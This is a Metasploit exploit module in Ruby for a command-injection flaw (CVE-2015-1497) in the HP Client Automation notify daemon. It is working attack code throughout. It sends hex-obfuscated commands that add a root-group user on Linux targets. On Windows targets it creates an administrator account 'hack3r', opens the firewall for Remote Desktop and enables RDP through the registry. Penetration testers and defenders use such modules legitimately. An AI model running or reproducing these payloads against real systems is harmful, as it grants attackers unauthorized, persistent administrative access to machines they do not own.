##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HP Client Automation Command Injection',
      'Description'    => %q{
        This module exploits a command injection vulnerability on HP Client Automation, distributed
        actually as Persistent Systems Client Automation. The vulnerability exists in the Notify
        Daemon (radexecd.exe), which doesn't authenticate execution requests by default neither.
        This module has been tested successfully on HP Client Automation 7.9 over Windows 7
        and CentOS 6.7(Final) but should work on 8.1, 9.0, 9.1 too].
      },
      'Author'         =>
        [
          'Ben Turner', # Vulnerability discovery
          'SlidingWindow' # Metasploit module, Twitter: @Kapil_Khot
        ],
      'References'     =>
        [
          ['CVE', '2015-1497'],
          ['ZDI', '15-038'],
          ['URL', 'https://radiasupport.accelerite.com/hc/en-us/articles/203659814-Accelerite-releases-solutions-and-best-practices-to-enhance-the-security-for-RBAC-and-Remote-Notify-features']
        ],
      'Privileged'     => true,
      'Platform'       => %w{ unix win },
      'DefaultOptions' =>
        {
            'WfsDelay' => 10
        },
      'Targets'        =>
        [
         [ 'HP Client Automation / Linux',
          {
              'Platform' => 'unix',
              'Arch'     => ARCH_CMD
            }
         ],

         [ 'HP Client Automation / Windows',
            {
              'Platform' => 'win',
              'Arch'     => ARCH_X86
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 02 2014'))

    register_options(
      [
        Opt::RPORT(3465)
      ], self.class)

  end

  def check
    connect
    sock.put("\x00") # port
    sock.put("#{rand_text_alphanumeric(4 + rand(3))}\x00") # user ID
    sock.put("#{rand_text_alpha(4 + rand(3))}\x00") # password
    sock.put("\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x69\x70\x63\x6f\x6e\x66\x69\x67\x00") # command
    res = sock.get_once

    if res == "x00"
      print_status("\nTarget is vulnerable!")
    else
      print_status("\nTarget may not be vulnerable...")
    end
    disconnect

  end

  def exploit
    case target['Platform']
    when 'win'
      print_status('Exploiting Windows target...')
      exploit_windows
    when 'unix'
      print_status('Exploiting Linux target...')
      exploit_unix
    else
      fail_with(Failure::NoTarget, 'Invalid target')
    end
  end

  def exploit_unix
    print_status('Adding a privileged user \'amiroot\' on the target...')
    connect
    sock.put("\x00") # port
    sock.put("124213\x00") # user ID
    sock.put("#{rand_text_alpha(4 + rand(3))}\x00") # password

#    sock.put("hide hide\x09sh -c 'useradd amiroot -p ID/JlXFIWowsE -g root'\x00") # command, here commands can be injected

    sock.put("\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x73\x68\x20\x2d\x63\x20\x27\x20\x75\x73\x65\x72\x61\x64\x64\x20\x61\x6d\x69\x72\x6f\x6f\x74\x20\x2d\x70\x20\x49\x44\x2f\x4a\x6c\x58\x46\x49\x57\x6f\x77\x73\x45\x20\x20\x2d\x67\x20\x72\x6f\x6f\x74\x27\x00")  #hide	sh -c ' useradd amiroot -p ID/JlXFIWowsE  -g root'

    res = sock.get_once
    if res == "\x00"
      print_status('Successfully added a privileged user on the target...')
      print_status('You should be able SSH into the target as user:amiroot, password:nopass')
    else
      print_status('Failed to add user \'amiroot\'...')
    end
    disconnect
  end

  def exploit_windows
    counter = 0
    connect
    sock.put("\x00") # port
    sock.put("S-1-5-18\x00") # user ID
    sock.put("#{rand_text_alpha(4 + rand(3))}\x00") # password
#   sock.put("hide hide\"\x09\"cmd.exe /c #{cmd}&\"\x00") # command, here commands can be injected

    print_status('Adding a local user hack3r/hack3r...')
    sock.put("\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x68\x61\x63\x6b\x33\x72\x20\x22\x68\x61\x63\x6b\x33\x72\x22\x20\x2f\x61\x64\x64\x00") # command, here commands can be injected
    res = sock.get_once
    if res == "\x00"
      print_status('Successfully added user hack3r/hack3r...')
      counter+= 1
    else
      print_status('Failed to add user hack3r/hack3r...')

    end
    disconnect
    print_status("Adding user 'hack3r' to Local Administrators' group...")
    connect
    sock.put("\x00") # port
    sock.put("S-1-5-18\x00") # user ID
    sock.put("#{rand_text_alpha(4 + rand(3))}\x00") # password
    sock.put("\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x61\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20\x68\x61\x63\x6b\x33\x72\x20\x2f\x61\x64\x64\x00") # command, here commands can be injected
    res = sock.get_once
    if res == "\x00"
      print_status("Successfully added user 'hack3r' to Local Administrators' group...")
      counter+= 1
    else
      print_status("Failed to add user 'hack3r' to Local Administrators' group...")

    end
    disconnect

    print_status("Adding user 'hack3r' to 'Remote Desktop Users' group...")
    connect
    sock.put("\x00") # port
    sock.put("S-1-5-18\x00") # user ID
    sock.put("#{rand_text_alpha(4 + rand(3))}\x00") # password
    sock.put("\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x22\x52\x65\x6d\x6f\x74\x65\x20\x44\x65\x73\x6b\x74\x6f\x70\x20\x55\x73\x65\x72\x73\x22\x20\x68\x61\x63\x6b\x33\x72\x20\x2f\x61\x64\x64\x00") # command, here commands can be injected
    res = sock.get_once
    if res == "\x00"
      print_status("Successfully added user 'hack3r' to 'Remote Desktop Users' group...")
      counter+= 1
    else
      print_status("Failed to add user 'hack3r' to 'Remote Desktop Users' group...")

    end
    disconnect

    print_status("Trying to enable Remote Desktop Service...")
    connect
    sock.put("\x00") # port
    sock.put("S-1-5-18\x00") # user ID
    sock.put("#{rand_text_alpha(4 + rand(3))}\x00") # password
    sock.put("\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x73\x68\x20\x66\x69\x72\x65\x77\x61\x6c\x6c\x20\x73\x65\x74\x20\x73\x65\x72\x76\x69\x63\x65\x20\x52\x65\x6d\x6f\x74\x65\x44\x65\x73\x6b\x74\x6f\x70\x20\x65\x6e\x61\x62\x6c\x65\x00") # command, here commands can be injected
    res = sock.get_once
    if res == "\x00"
      print_status("Successfully enabled Remote Desktop Service...")
      counter+= 1
    else
      print_status("Failed to enable Remote Desktop Service...")

    end
    disconnect

    print_status("Trying to enable Remote Desktop Service for all firewall profiles...")
    connect
    sock.put("\x00") # port
    sock.put("S-1-5-18\x00") # user ID
    sock.put("#{rand_text_alpha(4 + rand(3))}\x00") # password
    sock.put("\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x73\x68\x20\x66\x69\x72\x65\x77\x61\x6c\x6c\x20\x73\x65\x74\x20\x73\x65\x72\x76\x69\x63\x65\x20\x74\x79\x70\x65\x3d\x52\x65\x6d\x6f\x74\x65\x44\x65\x73\x6b\x74\x6f\x70\x20\x6d\x6f\x64\x65\x3d\x65\x6e\x61\x62\x6c\x65\x20\x70\x72\x6f\x66\x69\x6c\x65\x3d\x41\x4c\x4c\x00") # command, here commands can be injected
    res = sock.get_once
    if res == "\x00"
      print_status("Successfully enabled Remote Desktop Service for all firewall profiles...")
      counter+= 1
    else
      print_status("Failed to enable Remote Desktop Service for all firewall  profiles...")

    end
    disconnect

    print_status("Setting up the target server to listen to RDP connections...")
    connect
    sock.put("\x00") # port
    sock.put("S-1-5-18\x00") # user ID
    sock.put("#{rand_text_alpha(4 + rand(3))}\x00") # password
    sock.put("\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x09\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x72\x65\x67\x20\x61\x64\x64\x20\x22\x48\x4b\x45\x59\x5f\x4c\x4f\x43\x41\x4c\x5f\x4d\x41\x43\x48\x49\x4e\x45\x5c\x53\x59\x53\x54\x45\x4d\x5c\x43\x75\x72\x72\x65\x6e\x74\x43\x6f\x6e\x74\x72\x6f\x6c\x53\x65\x74\x5c\x43\x6f\x6e\x74\x72\x6f\x6c\x5c\x54\x65\x72\x6d\x69\x6e\x61\x6c\x20\x53\x65\x72\x76\x65\x72\x22\x20\x2f\x76\x20\x66\x44\x65\x6e\x79\x54\x53\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x73\x20\x2f\x74\x20\x52\x45\x47\x5f\x44\x57\x4f\x52\x44\x20\x2f\x64\x20\x30\x20\x2f\x66\x00") # command, here commands can be injected
    res = sock.get_once
    if res == "\x00"
      print_status("Successfully setup the target server to listen to RDP connections...")
      counter+= 1
    else
      print_status("Failed to setup the target server to listen to RDP connections...")

    end
    disconnect

    if counter == 6
      print("Exploit completed successfully. Try RDP to the target with username/password: hack3r/hack3r")
    else
      print("[-]Exploit Failed..")
    end

  end
end
